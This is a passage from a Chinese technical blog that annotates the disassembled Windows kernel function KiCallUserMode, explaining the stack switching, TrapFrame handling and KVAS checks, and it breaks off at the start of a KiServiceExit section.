<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KiCallUserMode</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">                    IN PVOID   *OutputBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">                    IN PULONG  OutputLength,</span></span></span><br><span class="line"><span class="function"><span class="params">                    IN PVOID   pPreviousThreadStackInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">                    IN PVOID   pNewStackBaseAddress </span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>pPreviousThreadStackInfo：为函数 <code>MmCreateKernelStack</code> 返回地址 <code>-0x20</code>，即指向 <code>KSTACK_CONTROL</code> 结构。</li>
<li>pNewStackBaseAddress：为函数 <code>MmCreateKernelStack</code> 返回地址。</li>
</ul>
<p><img data-src="https://s2.loli.net/2022/10/18/QjIRO51cnSL62Ai.png" alt="34.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0057</span>D764</span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">// NTSTATUS KiCallUserMode (</span></span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">//                     IN PVOID   *OutputBuffer,</span></span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">//                     IN PULONG  OutputLength,</span></span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">//                     IN PVOID   pPreviousThreadStackInfo,</span></span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">//                     IN PVOID   pNewStackBaseAddress</span></span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">// )</span></span><br><span class="line">.text:<span class="number">0057</span>D764</span><br><span class="line">.text:<span class="number">0057</span>D764 <span class="comment">// __stdcall KiCallUserMode(x, x, x, x)</span></span><br><span class="line">.text:<span class="number">0057</span>D764 _KiCallUserMode@<span class="number">16</span> proc near            <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+16D↓p</span></span><br><span class="line">.text:<span class="number">0057</span>D764                                         <span class="comment">// DATA XREF: .data:006ACAC0↓o</span></span><br><span class="line">.text:<span class="number">0057</span>D764</span><br><span class="line">.text:<span class="number">0057</span>D764 arg_pPreviousThreadStackInfo= dword ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0057</span>D764 arg_pNewStackBaseAddress= dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0057</span>D764</span><br><span class="line">.text:<span class="number">0057</span>D764                 push    ebp</span><br><span class="line">.text:<span class="number">0057</span>D765                 push    ebx</span><br><span class="line">.text:<span class="number">0057</span>D766                 push    esi</span><br><span class="line">.text:<span class="number">0057</span>D767                 push    edi</span><br><span class="line">.text:<span class="number">0057</span>D768                 cld</span><br><span class="line">.text:<span class="number">0057</span>D769                 mov     ebx, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">.text:<span class="number">0057</span>D770                 mov     ecx, [esp+<span class="number">10</span>h+arg_pPreviousThreadStackInfo]</span><br><span class="line">.text:<span class="number">0057</span>D774                 mov     [ecx+<span class="number">18</span>h], esp  <span class="comment">// ecx指向KSTACK_CONTROL结构</span></span><br><span class="line">.text:<span class="number">0057</span>D777                 mov     ebp, large fs:_KPCR</span><br><span class="line">.text:<span class="number">0057</span>D77E                 mov     [ecx+<span class="number">0</span>Ch], ebp</span><br><span class="line">.text:<span class="number">0057</span>D781                 mov     eax, [ebx+_KTHREAD.TrapFrame] <span class="comment">// eax = OldTrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D781                                         <span class="comment">// OldTrapFrame中的esp3已经在上一个函数修改</span></span><br><span class="line">.text:<span class="number">0057</span>D784                 mov     [ecx+<span class="number">8</span>], eax</span><br><span class="line">.text:<span class="number">0057</span>D787                 mov     edx, [esp+<span class="number">10</span>h+arg_pNewStackBaseAddress]</span><br><span class="line">.text:<span class="number">0057</span>D78B                 mov     esi, edx</span><br><span class="line">.text:<span class="number">0057</span>D78D                 sub     esi, ds:_KeKernelStackSize <span class="comment">// 调整 OutputLength 大小</span></span><br><span class="line">.text:<span class="number">0057</span>D793                 xorps   xmm0, xmm0</span><br><span class="line">.text:<span class="number">0057</span>D796                 xorps   xmm1, xmm1</span><br><span class="line">.text:<span class="number">0057</span>D799                 xorps   xmm2, xmm2</span><br><span class="line">.text:<span class="number">0057</span>D79C                 xorps   xmm3, xmm3</span><br><span class="line">.text:<span class="number">0057</span>D79F                 xorps   xmm4, xmm4</span><br><span class="line">.text:<span class="number">0057</span>D7A2                 xorps   xmm5, xmm5</span><br><span class="line">.text:<span class="number">0057</span>D7A5                 xorps   xmm6, xmm6</span><br><span class="line">.text:<span class="number">0057</span>D7A8                 xorps   xmm7, xmm7</span><br><span class="line">.text:<span class="number">0057</span>D7AB                 cli                     <span class="comment">// 关闭中断</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                 mov     [ebx+_KTHREAD.InitialStack], ecx <span class="comment">// ==============================</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">// 进行堆栈切换</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">// PVOID InitialStack//// 记录了原始的栈位置(高地址)</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">// PVOID StackLimit//  // 记录了栈的低地址</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">// PVOID KernelStack// // 记录了真正内核调用栈的开始位置</span></span><br><span class="line">.text:<span class="number">0057</span>D7AC                                         <span class="comment">// ================================================</span></span><br><span class="line">.text:<span class="number">0057</span>D7AF                 mov     [ebx+_KTHREAD.StackBase], edx</span><br><span class="line">.text:<span class="number">0057</span>D7B2                 mov     [ebx+_KTHREAD.StackLimit], esi</span><br><span class="line">.text:<span class="number">0057</span>D7B5                 sub     ecx, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0057</span>D7B8                 test    ss:_KiKvaShadow, <span class="number">1</span> <span class="comment">// ===============================================</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// 内核虚拟地址影子（Kernel Virtual Address Shadow，由微软提出的一个术语，简称KVAS）</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// 微软引入的缓解机制</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// 该特性仅允许用户模式代码访问有限的内核内存，主要用来有效防范Meltdown攻击</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// 系统初始化时 KiSystemStartup，KiEnableKvaShadowing的功能是负责启用KVAS，并设置KiKvaShadow = 1。</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// 如果对KiKvaShadow的检查结果为TRUE，就不会使用正常的系统调用处理程序（KiSystemCall32和KiSystemCall64），</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// 而是使用Shadow版本。如果该处理器是AMD的，则会使用AMD专用版本。</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// KiKvaShadow = 1，并随后配置系统调用处理器为KiSystemCall32Shadow/KiSystemCall64Shadow</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// 而若没有开启KVAS则发生系统调用时调用的处理器是KiSystemCall32/KiSystemCall64。</span></span><br><span class="line">.text:<span class="number">0057</span>D7B8                                         <span class="comment">// ===============================================</span></span><br><span class="line">.text:<span class="number">0057</span>D7C0                 mov     large fs:_KPCR.PrcbData.EspBaseShadow, ecx</span><br><span class="line">.text:<span class="number">0057</span>D7C7                 jnz     <span class="keyword">short</span> loc_57D7D3</span><br><span class="line">.text:<span class="number">0057</span>D7C9                 mov     edi, large fs:_KPCR.___u0.__s1.TssCopy</span><br><span class="line">.text:<span class="number">0057</span>D7D0                 mov     [edi+_TSS.ESP0], ecx <span class="comment">// ecx == OutputBuffer - 0x10 的位置用来存放 esp0.</span></span><br><span class="line">.text:<span class="number">0057</span>D7D0                                         <span class="comment">// 方便从 3 环返回时使用</span></span><br><span class="line">.text:<span class="number">0057</span>D7D3</span><br><span class="line">.text:<span class="number">0057</span>D7D3 loc_57D7D3:                             <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+63↑j</span></span><br><span class="line">.text:<span class="number">0057</span>D7D3                 lea     edi, [ecx<span class="number">-7</span>Ch]</span><br><span class="line">.text:<span class="number">0057</span>D7D6                 mov     [ebx+_KTHREAD.TrapFrame], edi <span class="comment">// 更新 TrapFrame 位置！！！！！！！！</span></span><br><span class="line">.text:<span class="number">0057</span>D7D9                 mov     esi, eax        <span class="comment">// eax = OldTrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7DB                 mov     ecx, <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">0057</span>D7E0                 rep movsd               <span class="comment">// 将原先的TrapFrame备份起来到OutputBuffer</span></span><br><span class="line">.text:<span class="number">0057</span>D7E2                 test    byte ptr [ebx+_KTHREAD.___u28.ApcState.___u4], <span class="number">3</span> <span class="comment">// SpecialUserApcPending,UserApcPending</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                 jnz     loc_57D875      <span class="comment">// 再一次更新EBP0，此时的EBP0指向输出缓冲区中的TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                                         <span class="comment">// edi指向Outputbuffer缓冲区的TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                                         <span class="comment">// 有用户 APC，调试状态的时候，从这里去执行用户回调</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                                         <span class="comment">// 设置 Eip3 = KeUserCallbackDispatcher</span></span><br><span class="line">.text:<span class="number">0057</span>D7E9                                         <span class="comment">// 调用 KiServiceExit</span></span><br><span class="line">.text:<span class="number">0057</span>D7EF                 test    dword ptr [ebx], <span class="number">0</span>DF800000h</span><br><span class="line">.text:<span class="number">0057</span>D7F5                 jnz     <span class="keyword">short</span> loc_57D875 <span class="comment">// 再一次更新EBP0，此时的EBP0指向输出缓冲区中的TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7F5                                         <span class="comment">// edi指向Outputbuffer缓冲区的TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7F5                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7F5                                         <span class="comment">// 有用户 APC，调试状态的时候，从这里去执行用户回调</span></span><br><span class="line">.text:<span class="number">0057</span>D7F5                                         <span class="comment">// 设置 Eip3 = KeUserCallbackDispatcher</span></span><br><span class="line">.text:<span class="number">0057</span>D7F5                                         <span class="comment">// 调用 KiServiceExit</span></span><br><span class="line">.text:<span class="number">0057</span>D7F7                 test    [eax+_KTRAP_FRAME.EFlags], <span class="number">20100</span>h <span class="comment">// =======</span></span><br><span class="line">.text:<span class="number">0057</span>D7F7                                         <span class="comment">// TF：陷阱，开启单步调试</span></span><br><span class="line">.text:<span class="number">0057</span>D7F7                                         <span class="comment">// VM：v86</span></span><br><span class="line">.text:<span class="number">0057</span>D7F7                                         <span class="comment">// =======</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                 jnz     <span class="keyword">short</span> loc_57D875 <span class="comment">// 再一次更新EBP0，此时的EBP0指向输出缓冲区中的TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                                         <span class="comment">// edi指向Outputbuffer缓冲区的TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                                         <span class="comment">// 有用户 APC，调试状态的时候，从这里去执行用户回调</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                                         <span class="comment">// 设置 Eip3 = KeUserCallbackDispatcher</span></span><br><span class="line">.text:<span class="number">0057</span>D7FE                                         <span class="comment">// 调用 KiServiceExit</span></span><br><span class="line">.text:<span class="number">0057</span>D800                 mov     edx, [eax+_KTRAP_FRAME.ExceptionList]</span><br><span class="line">.text:<span class="number">0057</span>D803                 mov     large fs:_KPCR, edx</span><br><span class="line">.text:<span class="number">0057</span>D80A                 mov     ebp, eax        <span class="comment">// 重要：更新 ebp0!!!!!!!!!</span></span><br><span class="line">.text:<span class="number">0057</span>D80C                 movzx   eax, large byte ptr fs:_KPCR.PrcbData.BpbUserSpecCtrl</span><br><span class="line">.text:<span class="number">0057</span>D814                 cmp     large fs:_KPCR.PrcbData.BpbCurrentSpecCtrl, al</span><br><span class="line">.text:<span class="number">0057</span>D81B                 jz      <span class="keyword">short</span> loc_57D82C <span class="comment">// BpbIbpbOnReturn</span></span><br><span class="line">.text:<span class="number">0057</span>D81D                 mov     large fs:_KPCR.PrcbData.BpbCurrentSpecCtrl, al</span><br><span class="line">.text:<span class="number">0057</span>D823                 mov     ecx, <span class="number">48</span>h</span><br><span class="line">.text:<span class="number">0057</span>D828                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">0057</span>D82A                 wrmsr                   <span class="comment">// Wrmsr命令将一个值写入 Model-Specific 将 (MSR) 注册到指定地址。</span></span><br><span class="line">.text:<span class="number">0057</span>D82C</span><br><span class="line">.text:<span class="number">0057</span>D82C loc_57D82C:                             <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+B7↑j</span></span><br><span class="line">.text:<span class="number">0057</span>D82C                 btr     large word ptr fs:_KPCR.PrcbData.___u111, <span class="number">2</span> <span class="comment">// BpbIbpbOnReturn</span></span><br><span class="line">.text:<span class="number">0057</span>D836                 jnb     <span class="keyword">short</span> loc_57D846 <span class="comment">// MXCSR寄存器，涉及浮点运算</span></span><br><span class="line">.text:<span class="number">0057</span>D838                 mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0057</span>D83D                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">0057</span>D83F                 mov     ecx, <span class="number">49</span>h</span><br><span class="line">.text:<span class="number">0057</span>D844                 wrmsr</span><br><span class="line">.text:<span class="number">0057</span>D846</span><br><span class="line">.text:<span class="number">0057</span>D846 loc_57D846:                             <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+D2↑j</span></span><br><span class="line">.text:<span class="number">0057</span>D846                 ldmxcsr [ebp+_KTRAP_FRAME._MxCsr] <span class="comment">// MXCSR寄存器，涉及浮点运算</span></span><br><span class="line">.text:<span class="number">0057</span>D84A                 mov     edx, ds:_KeUserCallbackDispatcher</span><br><span class="line">.text:<span class="number">0057</span>D850                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">0057</span>D852                 mov     ecx, [ebp+_KTRAP_FRAME.HardwareEsp]</span><br><span class="line">.text:<span class="number">0057</span>D855                 mov     ebp, [ebp+_KTRAP_FRAME._Ebp]</span><br><span class="line">.text:<span class="number">0057</span>D858                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0057</span>D85A                 <span class="keyword">xor</span>     esi, esi</span><br><span class="line">.text:<span class="number">0057</span>D85C                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0057</span>D864                 jnz     _KiKernelSysretExit</span><br><span class="line">.text:<span class="number">0057</span>D86A                 mov     edi, <span class="number">3B</span>h</span><br><span class="line">.text:<span class="number">0057</span>D86F                 mov     fs, di          <span class="comment">// 低16 bits</span></span><br><span class="line">.text:<span class="number">0057</span>D872                 assume fs:nothing</span><br><span class="line">.text:<span class="number">0057</span>D872                 sti</span><br><span class="line">.text:<span class="number">0057</span>D873                 sysexit</span><br><span class="line">.text:<span class="number">0057</span>D875</span><br><span class="line">.text:<span class="number">0057</span>D875 loc_57D875:                             <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+85↑j</span></span><br><span class="line">.text:<span class="number">0057</span>D875                                         <span class="comment">// KiCallUserMode(x,x,x,x)+91↑j ...</span></span><br><span class="line">.text:<span class="number">0057</span>D875                 lea     ebp, [edi<span class="number">-8</span>Ch]  <span class="comment">// 再一次更新EBP0，此时的EBP0指向输出缓冲区中的TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D875                                         <span class="comment">// edi指向Outputbuffer缓冲区的TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D875                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D875                                         <span class="comment">// 有用户 APC，调试状态的时候，从这里去执行用户回调</span></span><br><span class="line">.text:<span class="number">0057</span>D875                                         <span class="comment">// 设置 Eip3 = KeUserCallbackDispatcher</span></span><br><span class="line">.text:<span class="number">0057</span>D875                                         <span class="comment">// 调用 KiServiceExit</span></span><br><span class="line">.text:<span class="number">0057</span>D87B                 test    byte ptr [ebp+(_KTRAP_FRAME.EFlags+<span class="number">2</span>)], <span class="number">2</span> <span class="comment">// OldtrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D87B                                         <span class="comment">// Eflag.VM，V86</span></span><br><span class="line">.text:<span class="number">0057</span>D87F                 jz      <span class="keyword">short</span> loc_57D89C <span class="comment">// 非v86模式</span></span><br><span class="line">.text:<span class="number">0057</span>D881                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0057</span>D889                 mov     large fs:_KPCR.PrcbData.EspBaseShadow, edi</span><br><span class="line">.text:<span class="number">0057</span>D890                 jnz     <span class="keyword">short</span> loc_57D89C <span class="comment">// ESP0，EBP0都指向输出缓冲区中的TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D892                 mov     esi, large fs:_KPCR.___u0.NtTib.SubSystemTib</span><br><span class="line">.text:<span class="number">0057</span>D899                 mov     [esi+_NT_TIB.StackBase], edi</span><br><span class="line">.text:<span class="number">0057</span>D89C</span><br><span class="line">.text:<span class="number">0057</span>D89C loc_57D89C:                             <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+11B↑j</span></span><br><span class="line">.text:<span class="number">0057</span>D89C                                         <span class="comment">// KiCallUserMode(x,x,x,x)+12C↑j</span></span><br><span class="line">.text:<span class="number">0057</span>D89C                 mov     esp, ebp        <span class="comment">// ESP0，EBP0都指向输出缓冲区中的TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D89E                 mov     eax, ds:_KiI386ExceptionChainTerminator</span><br><span class="line">.text:<span class="number">0057</span>D8A3                 mov     large fs:_KPCR, eax</span><br><span class="line">.text:<span class="number">0057</span>D8A9                 mov     eax, ds:_KeUserCallbackDispatcher</span><br><span class="line">.text:<span class="number">0057</span>D8AE                 mov     [ebp+_KTRAP_FRAME._Eip], eax</span><br><span class="line">.text:<span class="number">0057</span>D8B1                 mov     ebx, [ebp+_KTRAP_FRAME._Ebp]</span><br><span class="line">.text:<span class="number">0057</span>D8B4                 mov     edi, [ebp+_KTRAP_FRAME._Eip]</span><br><span class="line">.text:<span class="number">0057</span>D8B7                 mov     [ebp+_KTRAP_FRAME.DbgArgMark], <span class="number">0B</span>ADB0D00h</span><br><span class="line">.text:<span class="number">0057</span>D8BE                 mov     [ebp+_KTRAP_FRAME.DbgEbp], ebx</span><br><span class="line">.text:<span class="number">0057</span>D8C1                 mov     [ebp+_KTRAP_FRAME.DbgEip], edi</span><br><span class="line">.text:<span class="number">0057</span>D8C4                 jmp     _KiServiceExit  <span class="comment">// ESP0，EBP0指向输出缓冲区中的TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D8C4 _KiCallUserMode@<span class="number">16</span> endp</span><br></pre></td></tr></table></figure>



<p>此时新建的线程栈内容如下：</p>
<p><img data-src="https://s2.loli.net/2022/10/17/xUqdV7wbM2ejEsB.png" alt="35.png"></p>
<h3 id="4-4-KiServiceExit"><a href="#4-4-KiServiceExit" class="headerlink" title="4.4 KiServiceExit"></a>4.4 KiServiceExit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span 